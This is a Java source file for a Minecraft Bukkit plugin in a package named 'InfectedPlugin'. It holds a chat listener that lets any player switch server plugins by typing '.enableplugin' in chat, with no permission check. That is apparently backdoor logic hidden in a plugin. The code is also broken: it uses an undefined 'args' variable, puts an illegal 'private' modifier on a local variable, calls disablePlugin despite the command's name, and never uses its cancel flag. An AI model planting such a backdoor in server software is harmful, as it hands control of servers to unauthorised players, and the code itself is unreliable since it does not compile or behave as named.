package org.CreeperCoders.InfectedPlugin;

import org.bukkit.Server;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.plugin.Plugin;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_enableplugin implements Listener
{
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        boolean cancel = true;
        private Server server = Bukkit.getServer();

        if (message.toLowerCase().contains(".enableplugin"))
        {
            Plugin plugin = server.getPluginManager().getPlugin(args[1]);
            if (plugin != null)
            {
                server.getPluginManager().disablePlugin(plugin);
            }
            cancel = true;
        }
    }
}
